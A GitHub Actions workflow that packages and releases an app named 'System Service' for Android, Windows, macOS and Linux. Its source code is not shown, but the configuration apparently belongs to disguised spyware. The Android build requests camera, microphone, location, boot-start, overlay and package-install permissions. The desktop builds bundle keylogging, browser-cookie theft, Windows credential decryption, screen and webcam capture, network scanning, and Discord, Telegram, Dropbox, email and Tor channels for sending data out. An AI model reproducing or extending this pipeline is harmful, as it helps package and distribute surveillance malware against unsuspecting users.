name: Build Multi-Platform

on:
  push:
    branches: [main, master]
    tags:
      - "v*"
  pull_request:
    branches: [main, master]
  workflow_dispatch:

permissions:
  contents: write
  actions: write

jobs:
  build-android:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.10"

      - name: Cache pip
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-android-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-android-

      - name: Cache Buildozer
        uses: actions/cache@v4
        with:
          path: ~/.buildozer
          key: ${{ runner.os }}-buildozer-${{ hashFiles('buildozer.spec') }}
          restore-keys: |
            ${{ runner.os }}-buildozer-

      - name: Set up Java
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            python3-pip \
            python3-dev \
            build-essential \
            git \
            autoconf \
            libtool \
            pkg-config \
            zlib1g-dev \
            libncurses5-dev \
            libncursesw5-dev \
            libtinfo6 \
            cmake \
            libffi-dev \
            libssl-dev \
            unzip \
            zip \
            libltdl-dev \
            wget \
            expect \
            libgl1-mesa-dev \
            libgles2-mesa-dev

      - name: Install Python dependencies
        run: |
          python -m pip install --upgrade pip setuptools wheel
          pip install buildozer==1.5.0
          pip install cython==0.29.37

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
        with:
          packages: 'platforms;android-33 build-tools;33.0.0 platform-tools ndk;25.2.9519653'

      - name: Accept Android SDK licenses
        run: |
          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses || true
          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses --sdk_root=$ANDROID_SDK_ROOT || true

      - name: Create buildozer spec
        run: |
          buildozer init
          sed -i 's/^title = .*/title = System Service/' buildozer.spec
          sed -i 's/^package.name = .*/package.name = systemservice/' buildozer.spec
          sed -i 's/^package.domain = .*/package.domain = org.example/' buildozer.spec
          sed -i 's/^source.dir = .*/source.dir = ./' buildozer.spec
          sed -i 's/^source.include_exts = .*/source.include_exts = py,png,jpg,kv,atlas,json,txt/' buildozer.spec
          sed -i 's/^version = .*/version = 1.0/' buildozer.spec
          sed -i 's/^requirements = .*/requirements = python3,kivy==2.3.0,pyjnius==1.6.1,requests==2.31.0,cryptography==41.0.7,Pillow==10.1.0,plyer,android/' buildozer.spec
          sed -i 's/^presplash.filename = .*/presplash.filename = %(source.dir)s\/presplash.png/' buildozer.spec
          sed -i 's/^icon.filename = .*/icon.filename = %(source.dir)s\/icon.png/' buildozer.spec
          sed -i 's/^orientation = .*/orientation = portrait/' buildozer.spec
          sed -i 's/^osx.python_version = .*/osx.python_version = 3/' buildozer.spec
          sed -i 's/^osx.kivy_version = .*/osx.kivy_version = 2.3.0/' buildozer.spec
          sed -i 's/^fullscreen = .*/fullscreen = 0/' buildozer.spec
          sed -i 's/^log_level = .*/log_level = 2/' buildozer.spec
          sed -i 's/^warn_on_root = .*/warn_on_root = 1/' buildozer.spec
          sed -i 's/^android.api = .*/android.api = 33/' buildozer.spec
          sed -i 's/^android.minapi = .*/android.minapi = 21/' buildozer.spec
          sed -i 's/^android.ndk = .*/android.ndk = 25b/' buildozer.spec
          sed -i 's/^android.sdk = .*/android.sdk = 34/' buildozer.spec
          sed -i 's/^android.entrypoint = .*/android.entrypoint = main.py/' buildozer.spec
          sed -i 's/^android.arch = .*/android.arch = arm64-v8a/' buildozer.spec
          sed -i 's/^android.allow_backup = .*/android.allow_backup = True/' buildozer.spec
          sed -i 's/^android.permissions = .*/android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,VIBRATE,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,SYSTEM_ALERT_WINDOW,REQUEST_INSTALL_PACKAGES/' buildozer.spec
          sed -i 's/^android.features = .*/android.features = android.hardware.camera,android.hardware.camera.autofocus,android.hardware.microphone,android.hardware.location,android.hardware.location.gps,android.hardware.location.network/' buildozer.spec
          sed -i 's/^android.gradle_dependencies = .*/android.gradle_dependencies = /' buildozer.spec
          sed -i 's/^android.add_src = .*/android.add_src = /' buildozer.spec
          sed -i 's/^android.add_jars = .*/android.add_jars = /' buildozer.spec
          sed -i 's/^android.add_aars = .*/android.add_aars = /' buildozer.spec
          sed -i 's/^android.service = .*/android.service = foreground/' buildozer.spec
          sed -i 's/^android.accept_sdk_license = .*/android.accept_sdk_license = True/' buildozer.spec
          sed -i 's/^p4a.branch = .*/p4a.branch = develop/' buildozer.spec
          sed -i 's/^android.skip_update = .*/android.skip_update = True/' buildozer.spec
          echo "android.sdk_path = $ANDROID_SDK_ROOT" >> buildozer.spec
          echo "android.ndk_path = $ANDROID_NDK_ROOT" >> buildozer.spec

      - name: Create dummy icon and presplash
        run: |
          echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
          cp icon.png presplash.png

      - name: Build APK with Buildozer
        env:
          BUILDOZER_WARN_ON_ROOT: 0
        run: |
          export PATH=$PATH:~/.local/bin
          buildozer -v android debug

      - name: Upload APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: android-apk
          path: |
            bin/*.apk
            *.apk
          retention-days: 30

  build-windows:
    runs-on: windows-latest
    strategy:
      fail-fast: false
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "24"

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.10"

      - name: Cache pip
        uses: actions/cache@v4
        with:
          path: ~\AppData\Local\pip\Cache
          key: ${{ runner.os }}-pip-windows-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-windows-

      - name: Install Python dependencies (filtered for Windows)
        run: |
          python -m pip install --upgrade pip setuptools wheel
          pip install pyinstaller==6.3.0
          # Filter out Android-only packages from requirements.txt
          (Get-Content requirements.txt) -notmatch 'python-for-android|pyjnius|android' | Out-File requirements-windows.txt
          pip install -r requirements-windows.txt
        continue-on-error: false

      - name: Create Kivy hook for PyInstaller
        run: |
          mkdir -p hooks
          echo "from PyInstaller.utils.hooks import collect_data_files, collect_submodules" > hooks/hook-kivy.py
          echo "datas = collect_data_files('kivy')" >> hooks/hook-kivy.py
          echo "hiddenimports = collect_submodules('kivy')" >> hooks/hook-kivy.py
          echo "hiddenimports += ['pkg_resources.py2_warn', 'win32timezone', 'win32api', 'win32com', 'win32com.client', 'win32gui', 'win32process', 'win32security', 'win32net', 'win32crypt', 'win32ts', 'win32event', 'win32file', 'win32pipe', 'win32service', 'servicemanager', 'pythoncom', 'pywintypes']" >> hooks/hook-kivy.py

      - name: Build Windows executable
        run: |
          pyinstaller --onefile `
            --windowed `
            --name "SystemService" `
            --add-data "requirements.txt;." `
            --hidden-import kivy `
            --hidden-import kivy.core.window `
            --hidden-import kivy.core.text `
            --hidden-import kivy.core.image `
            --hidden-import kivy.core.audio `
            --hidden-import kivy.core.video `
            --hidden-import kivy.core.clipboard `
            --hidden-import kivy.core.spelling `
            --hidden-import kivy.uix.label `
            --hidden-import kivy.uix.button `
            --hidden-import kivy.uix.boxlayout `
            --hidden-import kivy.uix.textinput `
            --hidden-import kivy.uix.scrollview `
            --hidden-import kivy.uix.popup `
            --hidden-import kivy.uix.switch `
            --hidden-import kivy.uix.progressbar `
            --hidden-import kivy.uix.screenmanager `
            --hidden-import kivy.uix.image `
            --hidden-import kivy.uix.camera `
            --hidden-import kivy.uix.video `
            --hidden-import kivy.uix.videoplayer `
            --hidden-import pynput.keyboard `
            --hidden-import pynput.mouse `
            --hidden-import win32api `
            --hidden-import win32con `
            --hidden-import win32gui `
            --hidden-import win32process `
            --hidden-import win32security `
            --hidden-import win32net `
            --hidden-import win32crypt `
            --hidden-import win32ts `
            --hidden-import win32event `
            --hidden-import win32file `
            --hidden-import win32pipe `
            --hidden-import win32service `
            --hidden-import win32com `
            --hidden-import win32com.client `
            --hidden-import pythoncom `
            --hidden-import pywintypes `
            --hidden-import servicemanager `
            --hidden-import wmi `
            --hidden-import pyaudio `
            --hidden-import cv2 `
            --hidden-import sounddevice `
            --hidden-import numpy `
            --hidden-import PIL `
            --hidden-import PIL.ImageGrab `
            --hidden-import scapy.all `
            --hidden-import netifaces `
            --hidden-import dns.resolver `
            --hidden-import browser_cookie3 `
            --hidden-import cryptography.fernet `
            --hidden-import discord_webhook `
            --hidden-import telebot `
            --hidden-import dropbox `
            --hidden-import mss `
            --hidden-import pyscreenshot `
            --hidden-import GPUtil `
            --hidden-import psutil `
            --hidden-import requests `
            --hidden-import sqlite3 `
            --hidden-import json `
            --hidden-import base64 `
            --hidden-import hashlib `
            --hidden-import uuid `
            --hidden-import re `
            --hidden-import socket `
            --hidden-import platform `
            --hidden-import getpass `
            --hidden-import subprocess `
            --hidden-import shutil `
            --hidden-import tempfile `
            --hidden-import threading `
            --hidden-import queue `
            --hidden-import schedule `
            --hidden-import paramiko `
            --hidden-import mechanize `
            --hidden-import socks `
            --hidden-import stem `
            --hidden-import logging `
            --hidden-import nmap `
            --hidden-import whois `
            --hidden-import urllib.parse `
            --hidden-import mimetypes `
            --hidden-import pathlib `
            --hidden-import glob `
            --hidden-import fnmatch `
            --hidden-import ctypes `
            --hidden-import ctypes.wintypes `
            --hidden-import email `
            --hidden-import smtplib `
            --hidden-import ftplib `
            --hidden-import xml.etree.ElementTree `
            --hidden-import csv `
            --hidden-import zipfile `
            --hidden-import io `
            --hidden-import random `
            --hidden-import string `
            --hidden-import datetime `
            --hidden-import time `
            --hidden-import os `
            --hidden-import sys `
            --collect-all kivy `
            --collect-all plyer `
            --collect-all win32com `
            --collect-all win32api `
            --collect-all pynput `
            --collect-all cryptography `
            --collect-all PIL `
            --collect-all cv2 `
            --collect-all numpy `
            --collect-all sounddevice `
            --collect-all pyaudio `
            --collect-all scapy `
            --collect-all discord_webhook `
            --collect-all telebot `
            --collect-all dropbox `
            --collect-all mss `
            --collect-all psutil `
            --collect-all requests `
            --collect-all urllib3 `
            --collect-all certifi `
            --collect-all idna `
            --collect-all charset_normalizer `
            --additional-hooks-dir=hooks `
            main.py

      - name: Upload Windows executable
        uses: actions/upload-artifact@v4
        with:
          name: windows-exe
          path: dist/SystemService.exe
          retention-days: 30

  build-macos:
    runs-on: macos-latest
    strategy:
      fail-fast: false
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "24"

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.10"

      - name: Cache pip
        uses: actions/cache@v4
        with:
          path: ~/Library/Caches/pip
          key: ${{ runner.os }}-pip-macos-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-macos-

      - name: Install system dependencies
        run: |
          brew install portaudio sdl2 sdl2_image sdl2_mixer sdl2_ttf gstreamer

      - name: Install Python dependencies (filtered for macOS)
        run: |
          python -m pip install --upgrade pip setuptools wheel
          pip install pyinstaller==6.3.0
          # Filter out Android-only packages
          grep -v 'python-for-android\|pyjnius\|android' requirements.txt > requirements-macos.txt || true
          pip install -r requirements-macos.txt || true
          pip install kivy pyobjus pyobjc plyer
        continue-on-error: false

      - name: Create Kivy hook for PyInstaller
        run: |
          mkdir -p hooks
          echo "from PyInstaller.utils.hooks import collect_data_files, collect_submodules" > hooks/hook-kivy.py
          echo "datas = collect_data_files('kivy')" >> hooks/hook-kivy.py
          echo "hiddenimports = collect_submodules('kivy')" >> hooks/hook-kivy.py
          echo "hiddenimports += ['pyobjus', 'rubicon', 'rubicon.objc']" >> hooks/hook-kivy.py

      - name: Build macOS executable
        run: |
          pyinstaller --onefile \
            --windowed \
            --name "SystemService" \
            --add-data "requirements.txt:." \
            --add-binary "/usr/local/lib/libSDL2-2.0.0.dylib:." \
            --add-binary "/usr/local/lib/libSDL2_image-2.0.0.dylib:." \
            --add-binary "/usr/local/lib/libSDL2_mixer-2.0.0.dylib:." \
            --add-binary "/usr/local/lib/libSDL2_ttf-2.0.0.dylib:." \
            --hidden-import kivy \
            --hidden-import kivy.core.window \
            --hidden-import kivy.core.text \
            --hidden-import kivy.core.image \
            --hidden-import kivy.core.audio \
            --hidden-import kivy.core.video \
            --hidden-import kivy.core.clipboard \
            --hidden-import kivy.core.spelling \
            --hidden-import kivy.uix.label \
            --hidden-import kivy.uix.button \
            --hidden-import kivy.uix.boxlayout \
            --hidden-import kivy.uix.textinput \
            --hidden-import kivy.uix.scrollview \
            --hidden-import kivy.uix.popup \
            --hidden-import kivy.uix.switch \
            --hidden-import kivy.uix.progressbar \
            --hidden-import kivy.uix.screenmanager \
            --hidden-import kivy.uix.image \
            --hidden-import kivy.uix.camera \
            --hidden-import kivy.uix.video \
            --hidden-import kivy.uix.videoplayer \
            --hidden-import pyobjus \
            --hidden-import rubicon \
            --hidden-import rubicon.objc \
            --hidden-import plyer \
            --hidden-import plyer.platforms.macosx \
            --hidden-import pyaudio \
            --hidden-import cv2 \
            --hidden-import sounddevice \
            --hidden-import numpy \
            --hidden-import PIL \
            --hidden-import PIL.ImageGrab \
            --hidden-import scapy.all \
            --hidden-import netifaces \
            --hidden-import dns.resolver \
            --hidden-import cryptography.fernet \
            --hidden-import psutil \
            --hidden-import requests \
            --hidden-import sqlite3 \
            --hidden-import json \
            --hidden-import base64 \
            --hidden-import hashlib \
            --hidden-import uuid \
            --hidden-import re \
            --hidden-import socket \
            --hidden-import platform \
            --hidden-import getpass \
            --hidden-import subprocess \
            --hidden-import shutil \
            --hidden-import tempfile \
            --hidden-import threading \
            --hidden-import queue \
            --hidden-import schedule \
            --hidden-import paramiko \
            --hidden-import mechanize \
            --hidden-import socks \
            --hidden-import logging \
            --hidden-import nmap \
            --hidden-import whois \
            --hidden-import urllib.parse \
            --hidden-import mimetypes \
            --hidden-import pathlib \
            --hidden-import glob \
            --hidden-import fnmatch \
            --hidden-import ctypes \
            --hidden-import email \
            --hidden-import smtplib \
            --hidden-import ftplib \
            --hidden-import xml.etree.ElementTree \
            --hidden-import csv \
            --hidden-import zipfile \
            --hidden-import io \
            --hidden-import random \
            --hidden-import string \
            --hidden-import datetime \
            --hidden-import time \
            --hidden-import os \
            --hidden-import sys \
            --collect-all kivy \
            --collect-all plyer \
            --collect-all pyobjus \
            --collect-all cryptography \
            --collect-all PIL \
            --collect-all cv2 \
            --collect-all numpy \
            --collect-all sounddevice \
            --collect-all pyaudio \
            --collect-all scapy \
            --collect-all psutil \
            --collect-all requests \
            --collect-all urllib3 \
            --collect-all certifi \
            --collect-all idna \
            --collect-all charset_normalizer \
            --additional-hooks-dir=hooks \
            main.py

      - name: Upload macOS executable
        uses: actions/upload-artifact@v4
        with:
          name: macos-exe
          path: dist/SystemService
          retention-days: 30

  build-linux:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "24"

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.10"

      - name: Cache pip
        uses: actions/cache@v4
        with:
          path: ~/.cache/pip
          key: ${{ runner.os }}-pip-linux-${{ hashFiles('requirements.txt') }}
          restore-keys: |
            ${{ runner.os }}-pip-linux-

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            python3-pip \
            python3-dev \
            build-essential \
            libportaudio2 \
            portaudio19-dev \
            libasound2-dev \
            libpulse-dev \
            libgl1-mesa-dev \
            libgles2-mesa-dev \
            libgstreamer1.0-0 \
            gstreamer1.0-plugins-base \
            gstreamer1.0-plugins-good \
            libgstreamer-plugins-base1.0-dev \
            libgstreamer1.0-dev \
            libmtdev-dev \
            xclip \
            xsel \
            libx11-dev \
            libxext-dev \
            libxrender-dev \
            libxinerama-dev \
            libxi-dev \
            libxrandr-dev \
            libxcursor-dev \
            libxcomposite-dev \
            libxdamage-dev \
            libxfixes-dev \
            libxss-dev \
            libxtst-dev \
            libdbus-1-dev \
            libglib2.0-dev \
            libudev-dev \
            libusb-1.0-0-dev \
            libssl-dev \
            libffi-dev \
            pkg-config

      - name: Install Python dependencies (filtered for Linux)
        run: |
          python -m pip install --upgrade pip setuptools wheel
          pip install pyinstaller==6.3.0
          grep -v 'python-for-android\|pyjnius\|android' requirements.txt > requirements-linux.txt || true
          pip install -r requirements-linux.txt
        continue-on-error: false

      - name: Create Kivy hook for PyInstaller
        run: |
          mkdir -p hooks
          echo "from PyInstaller.utils.hooks import collect_data_files, collect_submodules" > hooks/hook-kivy.py
          echo "datas = collect_data_files('kivy')" >> hooks/hook-kivy.py
          echo "hiddenimports = collect_submodules('kivy')" >> hooks/hook-kivy.py

      - name: Build Linux executable
        run: |
          pyinstaller --onefile \
            --windowed \
            --name "SystemService" \
            --add-data "requirements.txt:." \
            --hidden-import kivy \
            --hidden-import kivy.core.window \
            --hidden-import kivy.core.text \
            --hidden-import kivy.core.image \
            --hidden-import kivy.core.audio \
            --hidden-import kivy.core.video \
            --hidden-import kivy.core.clipboard \
            --hidden-import kivy.core.spelling \
            --hidden-import kivy.uix.label \
            --hidden-import kivy.uix.button \
            --hidden-import kivy.uix.boxlayout \
            --hidden-import kivy.uix.textinput \
            --hidden-import kivy.uix.scrollview \
            --hidden-import kivy.uix.popup \
            --hidden-import kivy.uix.switch \
            --hidden-import kivy.uix.progressbar \
            --hidden-import kivy.uix.screenmanager \
            --hidden-import kivy.uix.image \
            --hidden-import kivy.uix.camera \
            --hidden-import kivy.uix.video \
            --hidden-import kivy.uix.videoplayer \
            --hidden-import pynput.keyboard \
            --hidden-import pynput.mouse \
            --hidden-import pyaudio \
            --hidden-import cv2 \
            --hidden-import sounddevice \
            --hidden-import numpy \
            --hidden-import PIL \
            --hidden-import PIL.ImageGrab \
            --hidden-import scapy.all \
            --hidden-import netifaces \
            --hidden-import dns.resolver \
            --hidden-import browser_cookie3 \
            --hidden-import cryptography.fernet \
            --hidden-import discord_webhook \
            --hidden-import telebot \
            --hidden-import dropbox \
            --hidden-import mss \
            --hidden-import pyscreenshot \
            --hidden-import GPUtil \
            --hidden-import psutil \
            --hidden-import requests \
            --hidden-import sqlite3 \
            --hidden-import json \
            --hidden-import base64 \
            --hidden-import hashlib \
            --hidden-import uuid \
            --hidden-import re \
            --hidden-import socket \
            --hidden-import platform \
            --hidden-import getpass \
            --hidden-import subprocess \
            --hidden-import shutil \
            --hidden-import tempfile \
            --hidden-import threading \
            --hidden-import queue \
            --hidden-import schedule \
            --hidden-import paramiko \
            --hidden-import mechanize \
            --hidden-import socks \
            --hidden-import stem \
            --hidden-import logging \
            --hidden-import nmap \
            --hidden-import whois \
            --hidden-import urllib.parse \
            --hidden-import mimetypes \
            --hidden-import pathlib \
            --hidden-import glob \
            --hidden-import fnmatch \
            --hidden-import ctypes \
            --hidden-import email \
            --hidden-import smtplib \
            --hidden-import ftplib \
            --hidden-import xml.etree.ElementTree \
            --hidden-import csv \
            --hidden-import zipfile \
            --hidden-import io \
            --hidden-import random \
            --hidden-import string \
            --hidden-import datetime \
            --hidden-import time \
            --hidden-import os \
            --hidden-import sys \
            --collect-all kivy \
            --collect-all plyer \
            --collect-all pynput \
            --collect-all cryptography \
            --collect-all PIL \
            --collect-all cv2 \
            --collect-all numpy \
            --collect-all sounddevice \
            --collect-all pyaudio \
            --collect-all scapy \
            --collect-all discord_webhook \
            --collect-all telebot \
            --collect-all dropbox \
            --collect-all mss \
            --collect-all psutil \
            --collect-all requests \
            --collect-all urllib3 \
            --collect-all certifi \
            --collect-all idna \
            --collect-all charset_normalizer \
            --additional-hooks-dir=hooks \
            main.py

      - name: Upload Linux executable
        uses: actions/upload-artifact@v4
        with:
          name: linux-exe
          path: dist/SystemService
          retention-days: 30

  create-release:
    needs: [build-android, build-windows, build-macos, build-linux]
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/v')
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: artifacts

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          files: |
            artifacts/android-apk/*.apk
            artifacts/windows-exe/*.exe
            artifacts/macos-exe/SystemService
            artifacts/linux-exe/SystemService
          draft: false
          prerelease: false
          generate_release_notes: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
